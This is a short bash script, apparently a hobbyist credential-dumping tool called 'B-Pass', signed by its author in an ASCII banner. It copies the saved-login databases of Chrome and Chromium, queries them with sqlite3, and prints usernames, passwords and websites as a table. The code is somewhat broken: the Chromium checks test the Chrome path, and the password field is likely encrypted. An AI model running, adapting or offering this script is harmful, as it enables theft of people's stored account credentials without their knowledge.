
normal='\e[0m' 
blue='\e[1;94m' 
red='\e[1;31m' 
yellow='\e[1;33m' 
ul='\e[1;4m' 
purp='\e[1;35m' 
green='\e[1;32m' 
white='\e[97m' 
echo -e "$white" 
echo -en '
 /$$$$$$$          /$$$$$$$
| $$__  $$        | $$__  $$'"$blue    CODED BY @rebellionil"
echo -en "$white"
echo '
| $$  \ $$        | $$  \ $$ /$$$$$$   /$$$$$$$ /$$$$$$$
| $$$$$$$  /$$$$$$| $$$$$$$/|____  $$ /$$_____//$$_____/
| $$__  $$|______/| $$____/  /$$$$$$$|  $$$$$$|  $$$$$$
| $$  \ $$        | $$      /$$__  $$ \____  $$\____  $$/
| $$$$$$$/        | $$     |  $$$$$$$ /$$$$$$$//$$$$$$$/
|_______/         |__/      \_______/|_______/|_______/
'

if [[ -d .workspace ]] ; then rm -rf .workspace ; fi
mkdir .workspace ; cd .workspace
if [[ -f ~/.config/google-chrome/Default/Login\ Data ]] ; then
   echo -e "${green}[+] Chromium browser found"
fi
if [[ -f ~/.config/google-chrome/Default/Login\ Data ]] ; then
   echo -e "${green}[+] Chrome browser found"
fi
echo '[+]USERNAME    [+]PASSWORD   [+]WEBSITE' > data.txt
echo "| | |" >> data.txt
if [[ -f ~/.config/google-chrome/Default/Login\ Data ]] ; then
   cp ~/.config/google-chrome/Default/Login\ Data ./chrome.db
   sqlite3 -header -csv -separator "," chrome.db "SELECT * FROM logins" > chrome.csv
   cat chrome.csv | awk NR!=1 | cut -d "," -f4,6,8 | sed 's/,/\t /g' >> data.txt
fi
if [[ -f ~/.config/google-chrome/Default/Login\ Data ]] ; then
   cp ~/.config/chromium/Default/Login\ Data ./chromium.db
   sqlite3 -header -csv -separator "," chromium.db "SELECT * FROM logins" > chromium.csv
   cat chromium.csv | awk NR!=1 | cut -d "," -f4,6,8 | sed 's/,/\t /g' >> data.txt
fi
echo ""
echo -e "${purp}$( cat data.txt | column -t -s' ' | awk NR==1 )"
echo -en "$red"
cat data.txt | column -t -s' ' | grep -v 'WEBSITE'
cd ..
if [[ -d .workspace ]] ; then rm -rf .workspace ; fi
